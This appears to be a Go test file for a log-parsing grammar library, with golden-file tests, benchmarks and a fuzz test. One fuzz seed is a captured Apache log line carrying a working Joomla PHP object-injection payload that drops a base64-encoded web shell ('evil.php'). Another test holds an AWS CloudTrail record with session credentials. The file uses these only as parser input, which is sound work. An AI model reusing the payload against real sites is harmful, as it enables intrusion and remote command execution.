package mdt

import (
	"bufio"
	"bytes"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/fxamacker/cbor/v2"
	"trout.software/kraken/webapp/internal/features"
	"trout.software/kraken/webapp/internal/rand"
	"trout.software/kraken/webapp/internal/txtar"
)

func TestGrammars(t *testing.T) {
	// add new files to ./testdata/grammar/*.golden to create a new test
	fs, err := filepath.Glob("./testdata/grammar/*.golden")
	if err != nil {
		t.Fatal(err)
	}
	if len(fs) == 0 {
		t.Skip("no golden files in folder")
	}
	for _, path := range fs {
		t.Run(filepath.Base(path), func(t *testing.T) {
			defer features.Enable("favourtoken")()
			archive, err := txtar.ParseFile(path)
			if err != nil {
				t.Fatal(err)
			}

			grammar := mustparse(string(archive.Glob("grammar")[0].Data))
			spitDot(t, grammar, "golden_record_"+filepath.Base(path)+".png")

			lines := bytes.Split(archive.Glob("log")[0].Data, []byte("\n"))
			records := archive.Get("records")

			var buf bytes.Buffer
			for _, line := range lines {
				if len(line) == 0 {
					continue // ignore empty lines (caused by line breaks)
				}
				r, _ := ReadLine(grammar, line)
				got, _ := r.MarshalText()
				buf.WriteString(string(got) + "\n")
			}
			if bytes.Equal(buf.Bytes(), []byte(records)) {
				return
			}

			r := path[:len(path)-len("golden")] + "result"
			x := &txtar.Archive{
				Comment: archive.Comment,
				Files: []txtar.File{
					{Name: "grammar", Data: []byte(grammar.PrettyPrint("root"))},
					{Name: "log", Data: bytes.Join(lines, []byte("\n"))},
					{Name: "records", Data: buf.Bytes()},
				},
			}
			os.WriteFile(r, txtar.Format(x), os.ModePerm)
			t.Errorf("Error reading %s. Results in %s", path, r)
		})
	}
}

func TestQuickMatch(t *testing.T) {
	gram := mustparse(`
	root = _ "-- " ip _ .
	ip = { '0' … '9' | '.' } .
	`)

	spitDot(t, gram, "machine.png")

	orig := `my log -- 192.0.2.1 >> and more`
	rc, ok := ReadLine(gram, []byte(orig))
	if !ok {
		t.Error("did not match line")
	}

	spitDot(t, rc, "quickmatch.png")
}

func TestBig(t *testing.T) {
	gram := mustparse(`
	root = _ "'roleSessionName': '" username "'" _ .
	username = { ' ' … '&' | '(' … '~' } .`)
	spitDot(t, gram, "machine.png")

	orig := `"('eventVersion', '1.08')","('userIdentity', {'type': 'AWSService', 'invokedBy': 'ipam.amazonaws.com'})","('eventTime', '2023-01-06T16:29:51Z')","('eventSource', 'sts.amazonaws.com')","('eventName', 'AssumeRole')","('awsRegion', 'us-east-1')","('sourceIPAddress', 'ipam.amazonaws.com')","('userAgent', 'ipam.amazonaws.com')","('requestParameters', {'roleArn': 'arn:aws:iam::152229883546:role/aws-service-role/ipam.amazonaws.com/AWSServiceRoleForIPAM', 'roleSessionName': 'IpamResourceMonitoring', 'durationSeconds': 900})","('responseElements', {'credentials': {'accessKeyId': 'ASIASG4M3V2NC5CUAH4W', 'sessionToken': 'IQoJb3JpZ2luX2VjENn//////////wEaCXVzLWVhc3QtMSJHMEUCIFWIj0PTQd84PP93bV9G98BZUR3Gr6nSbKCkv/9JMInhAiEAlE86SbLWw+Fy/Dz8OkP+fE1RiAFipEdituQYwiBbLmsq1QIIMhABGgwxNTIyMjk4ODM1NDYiDP+8Yp5N8JjaIPizGiqyAgIaqPpXYAtA6fUjzY5JKa7EKmuUNkcYlERkfyhJFbpBLMzMGMZ70IIQjwaFL9tGKU4vXKNSMy3jT8Sih4ESDi4LlLGdi7fdPgfXjUxt6mQZDnOxPCO7hJG82VOKEFIMVqE0DBT0KfdKPoUT8KYgncExZhWBda1S98Qkx+I9xREaSm9HP9oopoWsWhdogwlTUH7mojOtNPQjJ5r3M3VYGdqS08eEXNbfh9Yyy4vcMhX02QbMHxtO/9lwK8Z1E8bcMy8FRkp9gvmVsLkZG/iDV8LPsUyRTW9wWp87YZZXb+ITiB4mLtLp0OPhqYkulqpFFgiwy015vK2sACKCvaMiMpAEftf5MpJ9z30gu+uAwi4kRYWax+olTtiFpZGL66b7jIckHN52aQHhsLiDdmJzH96n7jD/mOGdBjq/AYFAvTpwSFHa7ycg0xlLxgYB9VB0X/P2j7WQ0gUzi91HAR2SWWTtNEgqyiQZbD5b8bXiO9RnfyOIx9Jw4dzwfZ0A5CHrFhTN7skkmDe5YgFaCze9AX5l7YIuAaFiQlthN3OfmyXuM8T39cg72Rs8XBH7twGjezVjnM4agpNzhhzsiQ+As+IqnvV/7QadW2OFfPgFw7sxR7V5dO3NVPbykGricmTzf1Ih0u+BETvFAMMxXSFfI98EstQiYkU7mezt', 'expiration': 'Jan 6, 2023, 4:44:51 PM'}, 'assumedRoleUser': {'assumedRoleId': 'AROASG4M3V2NG3UK74O5H:IpamResourceMonitoring', 'arn': 'arn:aws:sts::152229883546:assumed-role/AWSServiceRoleForIPAM/IpamResourceMonitoring'}})","('requestID', 'ed924c98-e811-446b-89c5-2065d9b428da')","('eventID', '3544234e-9c43-4798-b99e-9c73a7206662')","('readOnly', True)","('resources', [{'accountId': '152229883546', 'type': 'AWS::IAM::Role', 'ARN': 'arn:aws:iam::152229883546:role/aws-service-role/ipam.amazonaws.com/AWSServiceRoleForIPAM'}])","('eventType', 'AwsApiCall')","('managementEvent', True)","('recipientAccountId', '152229883546')","('sharedEventID', '9d3f0124-642a-4546-ba1b-1e9b02499349')","('eventCategory', 'Management')"`
	rc, ok := ReadLine(gram, []byte(orig))
	if !ok {
		t.Error("did not match line")
	}

	spitDot(t, rc, "aws.png")
}

func TestFirstSplit(t *testing.T) {
	gram := mustparse("root = Field { \"#\" Field } ." +
		"Field = { '\u0020' … '\u0022' | '\u0024' … '\u007E' }.")
	spitDot(t, gram, "machine.png")

	f, err := os.Open("testdata/bench/fw_1.log")
	if err != nil {
		t.Fatal(err)
	}

	scan := bufio.NewScanner(f)
	scan.Scan()

	if err := scan.Err(); err != nil {
		t.Fatal(err)
	}

	rc, ok := ReadLine(gram, scan.Bytes())
	if !ok {
		t.Fatal("did not match")
	}
	spitDot(t, rc, "diag.png")
}

func FuzzApacheBacktrack(f *testing.F) {
	f.Add(`164.92.113.78 - - [06/Jun/2022:03:18:28 +0200] "GET / HTTP/1.1" 200 10479 "-" "}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:8:\"feed_url\";s:5494:\"eval(base64_decode('PD9waHANCg0KJGNvbnRlbnQgPSAnUENGRVQwTlVXVkJGSUdoMGJXdytEUW84YUhSdGJDQnNZVzVuUFNKbGJpSStEUW84YUdWaFpENE5DaUFnSUNBOGJXVjBZU0JqYUdGeWMyVjBQU0pWVkVZdE9DSStEUW9nSUNBZ1BHMWxkR0VnYUhSMGNDMWxjWFZwZGowaVdDMVZRUzFEYjIxd1lYUnBZbXhsSWlCamIyNTBaVzUwUFNKSlJUMWxaR2RsSWo0TkNpQWdJQ0E4YldWMFlTQnVZVzFsUFNKMmFXVjNjRzl5ZENJZ1kyOXVkR1Z1ZEQwaWQybGtkR2c5WkdWMmFXTmxMWGRwWkhSb0xDQnBibWwwYVdGc0xYTmpZV3hsUFRFdU1DSStEUW9nSUNBZ1BIUnBkR3hsUGtacGJHVWdWWEJzYjJGa1pYSThMM1JwZEd4bFBnMEtQQzlvWldGa1BnMEtQR0p2WkhrK0RRb2dJQ0FnUEhOd1lXNGdjM1I1YkdVOUltUnBjM0JzWVhrNmJtOXVaU0krVm5Wc2JpRWhQQzl6Y0dGdVBnMEtJQ0FnSUR4bWIzSnRJRzFsZEdodlpEMGljRzl6ZENJZ1pXNWpkSGx3WlQwaWJYVnNkR2x3WVhKMEwyWnZjbTB0WkdGMFlTSStEUW9nSUNBZ0lDQWdJRHh6ZEhKdmJtYytVMlZzWldOMElHRWdabWxzWlNCMGJ5QjFjR3h2WVdRZ09qd3ZjM1J5YjI1blBpQThhVzV3ZFhRZ2RIbHdaVDBpWm1sc1pTSWdibUZ0WlQwaWRYQnNiMkZrSWlBdlBnMEtJQ0FnSUNBZ0lDQThZbklnTHo0OFluSXZQZzBLSUNBZ0lDQWdJQ0E4WW5WMGRHOXVJSFI1Y0dVOUluTjFZbTFwZENJZ2JtRnRaVDBpZFhCc2IyRmtYMkowYmlJZ2MzUjViR1U5SW1KdmNtUmxjanB1YjI1bE8ySmhZMnRuY205MWJtUTZJekF3TUR0amIyeHZjam9qWm1abU8zQmhaR1JwYm1jNk5YQjRJREV3Y0hnN1ptOXVkQzEzWldsbmFIUTZZbTlzWkR0b1pXbG5hSFE2TlRCd2VEdGpkWEp6YjNJNmNHOXBiblJsY2pzaVBsVndiRzloWkNCMGFHVWdablZqYTJsdVp5QnphR2wwUEM5aWRYUjBiMjQrRFFvZ0lDQWdJQ0FnSUR4aWNpQXZQaUE4WW5JdlBnMEtJQ0FnSUR3dlptOXliVDROQ2lBZ0lDQThabTl5YlNCdFpYUm9iMlE5SW5CdmMzUWlQZzBLSUNBZ0lDQWdJQ0E4YzNSeWIyNW5QbEoxYmlCRGIyMXRZVzVrSUNoTGIyMTFkQ0REaDJGc3hMSEZuM1RFc1hJcE9pQThMM04wY205dVp6NDhhVzV3ZFhRZ2RIbHdaVDBpZEdWNGRDSWdibUZ0WlQwaVkyMWtJaUJ3YkdGalpXaHZiR1JsY2owaWQyaHZZVzFwSWlCemRIbHNaVDBpZDJsa2RHZzZOREF3Y0hnN1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNBalpXWmxabVZtTzNCaFpHUnBibWM2TlhCNElERXdjSGc3YUdWcFoyaDBPalF3Y0hnaUlDOCtEUW9nSUNBZ0lDQWdJRHhpY2lBdlBqeGljaUF2UGcwS0lDQWdJQ0FnSUNBOFluVjBkRzl1SUhSNWNHVTlJbk4xWW0xcGRDSWdibUZ0WlQwaWNuVnVYMk50WkNJZ2MzUjViR1U5SW1KdmNtUmxjanB1YjI1bE8ySmhZMnRuY205MWJtUTZJekF3TUR0amIyeHZjam9qWm1abU8zQmhaR1JwYm1jNk5YQjRJREV3Y0hnN1ptOXVkQzEzWldsbmFIUTZZbTlzWkR0b1pXbG5hSFE2TlRCd2VEdGpkWEp6YjNJNmNHOXBiblJsY2pzaVBsSjFiaUJqYjIxdFlXNWtQQzlpZFhSMGIyNCtEUW9nSUNBZ0lDQWdJRHhpY2k4K1BHSnlMejROQ2lBZ0lDQThMMlp2Y20wK0RRbzhMMkp2WkhrK0RRbzhMMmgwYld3K0RRbzhQM0JvY0NBTkNtVnljbTl5WDNKbGNHOXlkR2x1WnloRlgwRk1UQ0JlSUVWZlRrOVVTVU5GS1RzTkNpQWdJQ0JwWmlocGMzTmxkQ2drWDFCUFUxUmJJblZ3Ykc5aFpGOWlkRzRpWFNrcGV3MEtJQ0FnSUNBZ0lDQnBaaWhBYlc5MlpWOTFjR3h2WVdSbFpGOW1hV3hsS0NSZlJrbE1SVk5iSW5Wd2JHOWhaQ0pkV3lKMGJYQmZibUZ0WlNKZExDUmZSa2xNUlZOYkluVndiRzloWkNKZFd5SnVZVzFsSWwwcEtYc05DaUFnSUNBZ0lDQWdJQ0FnSUhCeWFXNTBJQ0pHYVd4bElHbHpJSFZ3Ykc5aFpHVmtMR05vWldOcklHbDBPaUE4WVNCb2NtVm1QVndpZXlSZlJrbE1SVk5iSW5Wd2JHOWhaQ0pkV3lKdVlXMWxJbDE5WENJK2V5UmZSa2xNUlZOYkluVndiRzloWkNKZFd5SnVZVzFsSWwxOVBDOWhQaUk3RFFvZ0lDQWdJQ0FnSUgxbGJITmxldzBLSUNBZ0lDQWdJQ0FnSUNBZ2NISnBiblFnSWtOaGJpQnViM1FnZFhCc2IyRmtJSFJvWlNCbWFXeGxJU0k3RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0I5Wld4elpXbG1LR2x6YzJWMEtDUmZVRTlUVkZzaWNuVnVYMk50WkNKZEtTbDdEUW9OQ2lBZ0lDQWdJQ0FnSkdOdFpDQTlJQ1JmVUU5VFZGc25ZMjFrSjEwN0RRb05DaUFnSUNBZ0lDQWdhV1lvWm5WdVkzUnBiMjVmWlhocGMzUnpLQ0p6YUdWc2JGOWxlR1ZqSWlrcGV3MEtJQ0FnSUNBZ0lDQWdJQ0FnSkhKMWJpQTlJSE5vWld4c1gyVjRaV01vSkdOdFpDazdEUW9nSUNBZ0lDQWdJQ0FnSUNCbFkyaHZJQ0k4Wm05dWRDQmpiMnh2Y2oxY0luSmxaRndpUGt0MWJHeGhic1N4YkdGdUlHbkZuMnhsZGlBNklITm9aV3hzWDJWNFpXTW9LU0E4TDJadmJuUStQR0p5SUM4K1BIQnlaVDRrY25WdVBDOXdjbVUrSWpzTkNpQWdJQ0FnSUNBZ2ZXVnNjMlZwWmlobWRXNWpkR2x2Ymw5bGVHbHpkSE1vSW1WNFpXTWlLU2w3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWtjblZ1SUQwZ1pYaGxZeWdrWTIxa0xDUnlaWE4xYkhRcE93MEtJQ0FnSUNBZ0lDQWdJQ0FnWldOb2J5QWlQR1p2Ym5RZ1kyOXNiM0k5WENKeVpXUmNJajVMZFd4c1lXN0VzV3hoYmlCcHhaOXNaWFlnT2lCbGVHVmpLQ2tnUEM5bWIyNTBQanhpY2lBdlBpSTdEUW9nSUNBZ0lDQWdJQ0FnSUNCbWIzSmxZV05vS0NSeVpYTjFiSFFnWVhNZ0pISmxjeWw3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSkhKbGN5QTlJSFJ5YVcwb0pISmxjeWs3RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWldOb2J5QWlQSE4wY205dVp6NWxlR1ZqTFQ0Z0pISmxjend2YzNSeWIyNW5QanhpY2lBdlBpSTdEUW9nSUNBZ0lDQWdJQ0FnSUNCOURRb2dJQ0FnSUNBZ0lIMWxiSE5sYVdZb1puVnVZM1JwYjI1ZlpYaHBjM1J6S0NKd2IzQmxiaUlwS1hzTkNpQWdJQ0FnSUNBZ0lDQWdJQ1J5ZFc0Z1BTQndiM0JsYmlna1kyMWtMQ0p5SWlrN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FrY21WemRXeDBJRDBnSWlJN0RRb2dJQ0FnSUNBZ0lDQWdJQ0JsWTJodklDSThabTl1ZENCamIyeHZjajFjSW5KbFpGd2lQa3QxYkd4aGJzU3hiR0Z1SUduRm4yeGxkaUE2SUhCdmNHVnVLQ2tnUEM5bWIyNTBQanhpY2lBdlBqeGljaTgrSWpzTkNpQWdJQ0FnSUNBZ0lDQWdJSGRvYVd4bEtDRm1aVzltS0NSeWRXNHBLWHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FrWW5WbVptVnlJRDBnWm1kbGRITW9KSEoxYml3ME1EazJLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FrY21WemRXeDBJQzQ5SUNJOGMzUnliMjVuUG5CdmNHVnVJQzArSUNSaWRXWm1aWEk4TDNOMGNtOXVaejQ4WW5JZ0x6NGlPdzBLSUNBZ0lDQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQWdJQ0FnY0dOc2IzTmxLQ1J5ZFc0cE93MEtJQ0FnSUNBZ0lDQWdJQ0FnWldOb2J5QWtjbVZ6ZFd4ME93MEtJQ0FnSUNBZ0lDQjlaV3h6WldsbUtHWjFibU4wYVc5dVgyVjRhWE4wY3lnaWNHRnpjM1JvY25VaUtTbDdEUW9nSUNBZ0lDQWdJQ0FnSUNCd1lYTnpkR2h5ZFNna1kyMWtLVHNOQ2lBZ0lDQWdJQ0FnSUNBZ0lHVmphRzhnSWp4aWNpQXZQanhpY2lBdlBqeGljaUF2UGp4bWIyNTBJR052Ykc5eVBWd2ljbVZrWENJK1MzVnNiR0Z1eExGc1lXNGdhY1dmYkdWMklEb2djR0Z6YzNSb2NuVW9LU0E4TDJadmJuUStQR0p5SUM4K0lqc05DaUFnSUNBZ0lDQWdmV1ZzYzJWcFppaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb0luTjVjM1JsYlNJcEtYc05DaUFnSUNBZ0lDQWdJQ0FnSUhONWMzUmxiU2drWTIxa0tUc05DaUFnSUNBZ0lDQWdJQ0FnSUdWamFHOGdJanhpY2lBdlBqeGljaUF2UGp4aWNpQXZQanhtYjI1MElHTnZiRzl5UFZ3aWNtVmtYQ0krUzNWc2JHRnV4TEZzWVc0Z2FjV2ZiR1YySURvZ2MzbHpkR1Z0S0NrZ1BDOW1iMjUwUGp4aWNpQXZQaUk3RFFvZ0lDQWdJQ0FnSUgxbGJITmxldzBLSUNBZ0lDQWdJQ0FnSUNBZ2NISnBiblFnSW5CaGMzTjBhSEoxS0Nrc2MyaGxiR3hmWlhobFl5Z3BMR1Y0WldNb0tTeHdiM0JsYmlncExITjVjM1JsYlNncElFRnJkR2xtSUdSbHhKOXBiQ0VpT3cwS0lDQWdJQ0FnSUNCOURRb05DaUFnSUNCOURRby9QZz09JzsNCmZpbGVfcHV0X2NvbnRlbnRzKCd0bXAvZXZpbC5waHAnLGJhc2U2NF9kZWNvZGUoJGNvbnRlbnQpKTsNCj8+'));JFactory::getConfig();exit\";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";b:1;}\xf0\xfd\xfd\xfd" "-"`)
	f.Add(`185.191.171.13 - - [15/Jun/2022:07:01:15 +0200] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" "-"`)

	gram := mustparse(`
root = ip " - - [" timestamp "] " url " " rcode " " size " " origin [ " " uagent " \"-\"" ].
ip = { '0' … '9' | '.' } .
timestamp = { ' ' … '\\' | '_' … '}' } .
url = '"' verb " " path " " method '"' .
verb = { 'A' … 'z' } .
path = { '#' … 'z' } .
method = { '#' … 'z' } .
rcode = { '0' … '9' } .
size = { '0' … '9' } .
uagent = '"' { ' ' … '}' } '"' .
origin = '"' { '#' … '}' } '"' .
	`)

	f.Fuzz(func(t *testing.T, a string) {
		// spitDot(t, gram, "fuzz_gram.png")
		rc, _ := ReadLine(gram, []byte(a))
		rc.WalkRoot() // exert asserts there
	})
}

func BenchmarkBacktrack(b *testing.B) {
	logs := []struct {
		label string
		name  string
		gram  Grammar
	}{
		{"any match fw", "testdata/bench/fw_1.log", mustparse(
			"root = Field { \"#\" Field } . Field = _ .")},
		{"any match apache", "testdata/bench/apache.log", mustparse(`
				root = ip " - - [" timestamp "] \"" url "\" " rcode " " (size | "-") " \"" origin "\"" [ " " uagent" \"-\"" ] .
				ip = _ .
				timestamp = _ .
				url = verb " " path " " method .
				rcode = { '0' … '9' } .
				size = { '0' … '9' } .
				origin = _ .
				uagent = _ . 
				verb = _ .
				path = _ .
				method = _ .`)},
		{"multi match fw", "testdata/bench/fw_1.log", mustparse(
			"root = Field { \"#\" Field } . Field = { '\u0020' … '\u0022' | '\u0024' … '\u007E' }.")},
	}

	for _, log := range logs {
		b.Run(log.label, func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				countThreadsCreated.Store(0)
				countLoopExit.Store(0)
				countExecOps.Store(0)

				f, err := os.Open(log.name)
				if err != nil {
					b.Fatal(err)
				}

				scan := bufio.NewScanner(f)
				for scan.Scan() {
					_, ok := ReadLine(log.gram, scan.Bytes())
					if !ok {
						b.Errorf("grammar %s did not match line %s", log.gram, scan.Text())
					}
				}

				if scan.Err() != nil {
					b.Fatal(scan.Err())
				}

				f.Close()
			}
			b.ReportMetric(float64(countThreadsCreated.Load())/float64(b.N), "threadcreated/op")
			b.ReportMetric(float64(countLoopExit.Load())/float64(b.N), "loopexit/op")
			b.ReportMetric(float64(countExecOps.Load())/float64(b.N), "ops/op")
		})
	}
}

func BenchmarkSerialize(b *testing.B) {
	g := mustparse("root = Field { \"#\" Field } ." +
		"Field = { '\u0020' … '\u0022' | '\u0024' … '\u007E' }.")

	f, err := os.Open("testdata/bench/fw_1.log")
	if err != nil {
		b.Fatal(err)
	}

	dst, err := os.Create(b.TempDir() + "/output")
	if err != nil {
		b.Fatal(err)
	}

	enc := cbor.NewEncoder(dst)
	enc.StartIndefiniteArray()

	cnt := 0
	orig := 0
	scan := bufio.NewScanner(f)

	for scan.Scan() {
		cnt++
		if cnt == b.N {
			break
		}
		orig += len(scan.Bytes())
		r, ok := ReadLine(g, scan.Bytes())
		if !ok {
			b.Errorf("grammar %s did not match", g)
		}
		enc.Encode(r)
	}
	enc.EndIndefinite()
	st, err := dst.Stat()
	if err != nil {
		b.Fatal(err)
	}
	b.ReportMetric(float64(st.Size()/int64(b.N)), "bytes/line")
	b.ReportMetric(float64(orig/b.N), "srcbytes/line")

	if err := dst.Close(); err != nil {
		b.Fatal(err)
	}

	if scan.Err() != nil {
		b.Fatal(scan.Err())
	}

	f.Close()
}

type Dottable interface {
	PrintDot(dst io.Writer)
}

// Run test in verbose mode to generate png files
func spitDot(t *testing.T, d Dottable, dst string) {
	if !testing.Verbose() {
		return
	}

	t.Helper()

	out, err := os.CreateTemp("", "pretty_*.dot")
	if err != nil {
		t.Fatal(err)
	}
	pf, sf, found := strings.Cut(dst, "*")
	if found {
		dst = pf + rand.Name() + sf
	}

	t.Log("using dot file", out.Name(), "to generate", dst)

	d.PrintDot(out)
	out.Close()

	msg, err := exec.Command("dot", "-Tpng", "-o"+dst, out.Name()).CombinedOutput()
	if err != nil {
		t.Fatalf("error running dot (%s): %s", err, msg)
	}
}

func BenchmarkGolden(b *testing.B) {
	// add new files to ./testdata/grammar/*.golden to create a new test
	fs, err := filepath.Glob("testdata/grammar/*.golden")
	if err != nil {
		b.Fatal(err)
	}
	if len(fs) == 0 {
		b.Skip("no golden files in folder")
	}
	for _, path := range fs {
		b.Run(filepath.Base(path), func(b *testing.B) {
			archive, err := txtar.ParseFile(path)
			if err != nil {
				b.Fatal(err)
			}

			grammar := mustparse(string(archive.Glob("grammar")[0].Data))
			lines := bytes.Split(archive.Glob("log")[0].Data, []byte("\n"))

			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				for _, line := range lines {
					if len(line) == 0 {
						continue // ignore empty lines (caused by line breaks)
					}
					ReadLine(grammar, line)
				}
			}
			b.ReportMetric(float64(countThreadsCreated.Load())/float64(b.N), "threadcreated/op")
			b.ReportMetric(float64(countLoopExit.Load())/float64(b.N), "loopexit/op")
			b.ReportMetric(float64(countExecOps.Load())/float64(b.N), "ops/op")
		})
	}
}
